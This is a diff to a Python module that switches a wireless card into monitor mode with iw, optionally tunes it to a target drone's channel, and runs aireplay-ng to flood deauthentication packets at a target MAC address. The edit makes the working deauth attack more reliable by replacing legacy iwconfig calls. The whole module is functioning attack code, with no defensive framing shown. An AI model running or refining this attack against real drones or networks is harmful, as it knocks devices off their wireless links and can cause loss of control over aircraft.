@@ -79,34 +79,38 @@ try:
     result = sudo_exec(f"ifconfig {interface} down")
     if result.returncode != 0:
         print(f"WARNING: ifconfig down returned code {result.returncode}")
-    
+
     time.sleep(1)
-    
+
+    # iwconfig's mode/channel ioctls are the legacy Wireless Extensions
+    # (WEXT) API, which the driver in use here doesn't reliably support -
+    # `iw` talks over nl80211 instead, which it does support (same fix
+    # as the scanner).
     print("[*] Setting interface to monitor mode...")
-    result = sudo_exec(f"iwconfig {interface} mode monitor")
+    result = sudo_exec(f"iw {interface} set monitor none")
     if result.returncode != 0:
-        print(f"WARNING: iwconfig mode monitor returned code {result.returncode}")
-    
+        print(f"WARNING: iw set monitor returned code {result.returncode}")
+
     time.sleep(1)
-    
+
     print("[*] Setting interface to up...")
     result = sudo_exec(f"ifconfig {interface} up")
     if result.returncode != 0:
         print(f"WARNING: ifconfig up returned code {result.returncode}")
-    
+
     time.sleep(1)
 
     # Verify monitor mode is enabled
     print("[*] Verifying monitor mode is enabled...")
-    verify = subprocess.run(f"iwconfig {interface} | grep -i mode", shell=True, capture_output=True, text=True)
+    verify = subprocess.run(f"iw dev {interface} info | grep -i type", shell=True, capture_output=True, text=True)
     print(verify.stdout.strip() if verify.stdout else "Could not verify monitor mode")
 
     # Targeting specific channel of target drone (optional)
     if target_channel:
         print(f"[*] Setting channel to {target_channel}...")
-        result = sudo_exec(f"iwconfig {interface} channel {target_channel}")
+        result = sudo_exec(f"iw {interface} set channel {target_channel}")
         if result.returncode != 0:
-            print(f"WARNING: iwconfig channel returned code {result.returncode}")
+            print(f"WARNING: iw set channel returned code {result.returncode}")
         time.sleep(1)
     else:
         print("[*] Skipping channel configuration (channel not specified)")
@@ -114,7 +118,7 @@ try:
     # Deauth attack command
     print(f"[*] Starting deauth attack...")
     print(f"[*] Command: aireplay-ng -0 {packets} -a {target_mac} {interface}")
-    
+
     # aireplay-ng
     # -0 : Deauth attack
     # packets : Number of deauth packets to send (0 = infinite)
@@ -123,7 +127,7 @@ try:
     # interface : Network interface to use
 
     result = sudo_exec(f"aireplay-ng -0 {packets} -a {target_mac} {interface}")
-    
+
     if result.returncode != 0:
         print(f"ERROR: aireplay-ng failed with return code {result.returncode}")
         print("\nDEBUG INFO:")
@@ -135,7 +139,7 @@ try:
         sys.exit(1)
     else:
         sudo_exec(f"ifconfig {interface} down")
-        sudo_exec(f"iwconfig {interface} mode managed")
+        sudo_exec(f"iw {interface} set type managed")
         sudo_exec(f"ifconfig {interface} up")
         print("[+] Deauth attack completed successfully!")
         sys.exit(0)
@@ -143,4 +147,3 @@ try:
 except Exception as e:
     print(f"ERROR: Deauth module failed: {e}")
     sys.exit(1)
-
